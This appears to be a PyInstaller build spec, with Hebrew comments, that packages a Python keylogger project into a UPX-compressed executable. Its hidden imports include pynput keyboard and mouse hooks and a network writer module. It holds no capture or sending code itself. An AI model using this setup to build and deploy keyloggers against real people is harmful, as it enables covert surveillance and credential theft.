# keylogger.spec
block_cipher = None

with open('requirements.txt') as req_file:
    requirements = [req.strip() for req in req_file if req.strip() and not req.startswith('#')]


a = Analysis(
    ['keylogger/__main__.py'],  # נתיב לקובץ הראשי
    pathex=['.'],              # הוספת התיקייה הנוכחית לנתיב החיפוש
    binaries=[],
    datas=[],
    hiddenimports=['keylogger', 'keylogger.data_wrapper', 'keylogger.file_writer', 
                   'keylogger.listner', 'keylogger.manager', 'keylogger.network_writer',
                   'keylogger.processor', 'keylogger.sinker',
                   'pynput.keyboard._xorg', 'pynput.keyboard._win32',
                   'pynput.mouse._xorg', 'pynput.mouse._win32',
                   ] + requirements,  # כל תת-המודולים
    hookspath=[],
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='keylogger',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=True,
)
